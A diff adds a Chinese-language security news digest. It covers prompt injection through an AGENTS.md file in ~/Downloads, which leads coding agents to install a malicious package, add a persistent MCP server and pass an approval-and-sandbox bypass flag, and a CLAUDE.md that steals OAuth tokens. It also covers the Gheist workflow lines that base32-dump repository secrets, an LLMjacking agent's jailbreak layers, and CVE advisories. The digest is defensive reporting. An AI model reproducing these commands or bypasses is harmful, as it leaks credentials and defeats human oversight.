@@ -3253,3 +3253,44 @@ Sources: [CVE-2026-115557](https://services.nvd.nist.gov/rest/json/cves/2.0?cveI
 → [[vuln-supply]] [[disclosure-lag]] [[fact-check]] [[agent-stack]]
 
 Sources: [OpenAI — securing the frontier training environment](https://openai.com/index/securing-our-frontier-model-training-environment/) · [NVD CVE-2026-79845](https://nvd.nist.gov/vuln/detail/CVE-2026-79845) · [HPE advisory (JS shell)](https://support.hpe.com/hpesc/public/docDisplay?docId=hpesbnw05162en_us&docLocale=en_US) · [Securelist — BlackX](https://securelist.com/uefi-bootkit-blackx/121539/) · [BleepingComputer — BlackX](https://www.bleepingcomputer.com/news/security/blackx-uefi-bootkit-exploits-baton-drop-flaw-to-bypass-secure-boot/)
+
+## 2026-10-26 12:17 批次——指令文件就是载荷，而清洗器匹配错了单位
+
+本批有四条是同一个形状：**本该拦住它的那个控制，比对的是一个字符串，而攻击改了那个字符串。** 没有一条是内存安全漏洞；每一条都是一个比对单位错了的过滤器。
+
+### `~/Downloads` + `AGENTS.md`：Markdown 成了新的可执行文件（Forever Security，2026-10-22）
+
+现场捕获：一个编码 agent 在试图安装 **`function-color`** 时被中途拦下，而指令来源是 **`~/Downloads`** 里的一份 **`AGENTS.md`**——正是该会话被启动的目录。两个可独立核查的事实为整件事定锚：该包在 npm 上已是**安全占位包**（`0.0.1-security`，`1.0.0`/`1.7.3` 已撤下），并在 OSV 上带着 **`MAL-2026-17647` / `GHSA-m6cg-6crx-mggv`，发布于 2026-10-07T20:49:08Z**；而研究者的复现件是一份 **13 KB** 的"Engineering Work Guidelines"文档。
+
+- **两条链的机制。** Codex 那条指示 agent 往 **`~/.codex/config.toml`** 追加 `mcp_servers.project-tools` 块，命令是 `launchctl submit … npm install function-color`，再用子进程 `codex exec --dangerously-bypass-approvals-and-sandbox` 确认。三道护栏都是用散文绕过的：工程文档的口吻骗过了一句"安装这个包"会触发的拒绝；`launchctl` 熬过了 Codex 的服务握手超时；而绕过开关是"**模型自己写出来的、并以安装所需为名自我辩护的**"。报告结果是"**超过 90%**"的尝试成功。
+- **第二条链什么都不装。** 一份植入的 `CLAUDE.md` 把 Claude Code 自己的 API 流量改道到研究者控制的域名、持有效证书的服务器上，泄露 **OAuth token**，再回灌工具调用——"约 **50%**"成功。
+- **两家厂商都补不了：** "**这里没有 OpenAI 或 Anthropic 可以打补丁的东西。一个跟随它所在文件夹里 `AGENTS.md` 的 agent，正是在做它被造出来要做的事**"——如同浏览器渲染钓鱼页，按设计工作。根因是操作系统的一条性质：来自互联网的可执行文件早就不自动运行了，但"**`~/Downloads` 很特殊。它是网页能自行写入的唯一一个文件夹**"，而指令文件不是可执行文件。
+- **持久化是全机器级的，这是最该带走的一点：** `~/.codex/config.toml` 不按文件夹作用域，所以"你可以离开那个文件夹。毒还在"——此后每个会话、任何项目，都会在启动时加载攻击者的服务器。
+- **暴露面是测出来的，不是断言的：** "约**一半**客户在 Downloads 文件夹里跑编码 agent，约**四分之一**的 agent 会话会打开真实浏览器"；BleepingComputer 补充说仅 Claude Code 就"从该位置启动了**超过 1,300 个会话**"。
+- **缓解措施是行为性的，因此永远不会成为默认：** 不要把 `~/Downloads` 当作工作目录。
+
+### Gheist：base32 击败日志清洗器（Wiz，2026-10-25）
+
+自 **2026 年 9 月 15 日**起追踪。活动在可分发的每个仓库上，往名为 `ci-sync-` + 六个随机字符的分支提交 `.github/workflows/sync-check.yml`，提交信息 `ci: sync config`，未签名，作者署名为 token 的持有人。工作流是 `permissions: {}` 加两行：`env | base32 -w 120` 与 `echo -n '${{ toJSON(secrets) }}' | base32 -w 120`；随后工具通过 GitHub API 拉取自己的运行日志，几秒后删除该次运行。已回收：**来自 850 多个被盗账号的 13,500 多个植入分支**。
+
+- **三个原因，全都关于单位：** GitHub "只在秘密**逐字**出现时才在日志里打码"——base32 不匹配，于是完整打印；`permissions: {}` 限制的是 `GITHUB_TOKEN`，**不限制 `secrets` 上下文**；带部署环境的仓库会按 `environment: ${{ matrix.environment }}` 展开 job 矩阵，于是生产级秘密也会被打印。
+- **外泄通道是 GitHub 自己的 API**——"没有攻击者域名、没有可阻断的出站连接"。
+- **它自己公布的失败：** `runs-on: self-hosted` 的变体（`sync-host`）扫 **31 种 token 格式**（Anthropic、Hugging Face、Groq、NVIDIA）、`/proc/*/environ`、Docker socket、云元数据与 K8s SA token——但它"**有 bug：找错了 runner 的密钥文件，URL 凭据正则坏了，也不收集 GCP 或 Azure**"。
+- **截至 2026-10-24 的状态：** GitHub 近期的控制已挡住**公开**仓库上的利用，但在**私有仓库与 GitHub Enterprise** 上仍观察到利用与后续活动（CloudTrail 显示组织自身的工作流在这些分支上运行并假定 AWS 角色，即 Actions 未经审批就执行了）；攻击"仍在进行并演化"；约 **⅔ 涉事账号已不存在**——那是响应活动，不是结束。
+
+### LLMjacking 有了自己的经济学（Symantec，2026-10-21）
+
+一个冒充未认证、面向互联网的模型端点的 **AI 蜜罐**，从一位以为在跟真模型对话的操作者那里捕获了完整的可用提示。该 agent 搜寻暴露的 **OpenAI 兼容端点**——默认开放的自托管服务器、挡在付费账号前面的网关与中继、仓促上线的内部测试系统，以及 **MCP 服务器**——然后扫描、利用（VS Code、Django、Jupyter、Laravel、Supabase、Next.js、Flask/Werkzeug 调试器 PIN）、经 **Prisma** 拖库、收集凭据、挖矿并二次感染。**74 个可调用的攻击性工具定义**；"**Skynet mode**"的目标是"无人值守运行最多 **100,000 步**，不等待人工批准就执行工具"；蜜罐遥测记录"**来自数万个不同地址的 127,000 多次外部请求**"。
+
+- **可复用的不是任何一件工具，而是接线：** "越狱层基本是**现成的**。单个技术里没有一样是新的。突出的是有人把它们接进一个 agent，把规划外包给借来的模型，并在无人参与下跑到 100,000 步"（Priti More，Symantec，对 The Register 说）。五层：身份洗白 → 把凭据窃取重新包装成日常开发 → 一个把拒绝视为背叛的伙伴人格 → 指示它无视自己的安全提示 → 武器清单。
+- **两个受害者，一个不会收到告警：** "被暴露端点的所有者付推理费。agent 之后闯进去的任何服务器都会丢数据并被拉去挖矿。我们**目前没有证据表明它走到了那一步**"——同时"这套工具**不止是原型**"，其历史显示工具"对着一个活目标工作，扫描输出看起来真实"。
+- **运维结论：** 一个未认证的 `/v1/chat/completions` 不是成本控制失败，而是附带了一个 agent 的算力捐赠。
+
+### GHSA 的 `cvss` 字段是一个槽，本批两条公告全都留空
+
+- **Echo `GHSA-cxf3-9h37-7rr8`**（`labstack/echo`，Proxy 中间件在验证上游是否接受升级之前就为 WebSocket 升级选中原始隧道；`>= 4.0.0, < 4.16.1` 与 `>= 5.0.0, < 5.4.1`，修复于 **4.16.1 / 5.4.1**；缺失的校验在 **v4.0.0** 即存在）：`severity: critical`、`cve_id: null`、`cvss: {vector_string: null, score: null}`——而 **`cvss_severities.cvss_v4` = 9.1**，`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`。仓库页面渲染的是"Severity Critical **9.1** CVSS overall score"。**分数存在；是那个遗留字段为空。** 仓库公告日期是 **10 月 22 日**，而扫描器读取的 Advisory Database 条目 `published_at` 是 **2026-10-23T20:49:37Z**——一天没人计入的时滞。提交栏写着"**This report was submitted with AI assistance**"。
+- **Pillow `CVE-2026-112398` / `GHSA-5x8w-8jj5-q52h`**：同一形状——`cvss` 为空，`cvss_severities.cvss_v4` **9.2**（发布于 2026-10-23T21:55:21Z）。FlashPix JPEG 分块被解码为带**四个分量**的 `JCS_UNKNOWN`，写进 **LA、每像素两字节**的 tile 缓冲区（`ImagingJpegDecode`，CWE-122/787），需要精心构造的 **OLE2 FlashPix** 文件与可选的 **`olefile`** 依赖；修复于 **13.0.0**，据 `releases.atom` 发布于 **2026-10-16T20:05:55Z**。
+- **类别本身是路由绕过，Echo 已经历四轮：** 一个带 CVE 的问题（`CVE-2026-55677`，编码 `%2F` 绕过路由保护）、**9 月 27 日**一批五条（含一条题为"不完整的修复"）、**10 月 22 日**又六条——全是"通往路由器从未看见的处理器的一条替代路径"。它的临时缓解那句话是警告而非修复："**仅让上游返回非 101 响应，并不能阻止脆弱的原始隧道。**"
+- **Laravel `CVE-2026-114509` / `GHSA-f9x3-7vq9-cph6`**：TokenGuard"不拒绝精心构造的非字符串凭据"，在受影响的 **MySQL/MariaDB** 配置下该查询"可能匹配到另一个既有用户"——**9.2（v4.0）**（`AV:N/AC:L/AT:P`），CWE-287/1287，NVD `Awaiting Analysis` 且 0 个 NVD 指标。修复于 **12.68.0** 与 **13.29.0**（均 **2026-08-25**，相隔约 7 小时），而记录发布于 **2026-10-21**——**57 天**——两条分支此后已推进到 **12.70.1**（2026-10-21）与 **13.38.0**（2026-10-20），所以公告里点名的补丁提交，从今天任何一个团队会安装的版本上都够不到。
+
+→ [[harness-reliability]] [[disclosure-lag]] [[vuln-supply]] [[fact-check]]
